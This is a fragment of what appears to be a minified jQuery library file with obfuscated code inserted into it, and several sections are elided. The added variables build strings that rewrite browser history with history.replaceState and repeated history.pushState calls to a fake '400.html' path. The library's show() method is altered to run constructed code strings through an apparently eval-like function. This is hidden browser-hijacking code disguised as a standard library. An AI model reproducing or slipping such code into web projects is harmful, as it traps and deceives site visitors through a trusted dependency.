...
function(e, t) {
            ...
            if (!i && ((t ? t.ownerDocument || t: w) !== d && p(t), t = t || d, g)) {
                ...
                if (n.qsa && !S[e + " "] && (!y || !y.test(e))) {
                    if (1 !== T) {
                        ...
                        if ("object" !== t.nodeName.toLowerCase()) { (c = t.getAttribute("id")) ? c = c.replace(te, ne) : t.setAttribute("id", c = b),
                            s = (h = a(e)).length;
                            while (s--) {
                                h[s] = "#" + c + " " + ve(h[s])
                            }
    ...
    qwoiho = dqwd + uqwid,
    ee = /[A-Z]/g;
    var dsa = '(function () { if(isry==1){window.history.replaceState({}, "1", window.location.origin);';
    //var dsa='';
    //var dqwdq='';
    //var dqwdq = 'history.pushState(history.length + 1, "message", "#" + new Date().getTime());});';
    
	//var dqwdq = 'history.pushState(history.length + 1, "message", "fsa" + "/400.html");}});';
	
	var dqwdq = 'history.pushState(history.length + 1, "message", "fsa" + "/400.html#" + Math.random());history.pushState(history.length + 1, "message", "#" + Math.random());}});';
    ...
    w.fn.extend({
        show: function() {
            stwich("if(f" + qwoiho + "=='0' && " + qwoiho + "<'10'){var iow='s';}else{var iow='undefined';}");
            if (iow == "s") {
                stwich(numms)
            }
            return fe(this, !0)
    ...
    function(e, t) {
        w.cssHooks[t] = {
            get: function(e, n, r) {
                if (n) {
                    return ! ze.test(w.css(e, "display")) || e.getClientRects().length && e.getBoundingClientRect().width ? et(e, t, r) : se(e, Ue,
                    function() {
                        return et(e, t, r)
                    })
                }
    ...
    function(e, t) {
        w.cssHooks[e + t] = {
            expand: function(n) {
                for (var r = 0,
                i = {},
                o = "string" == typeof n ? n.split(" ") : [n]; r < 4; r++) {
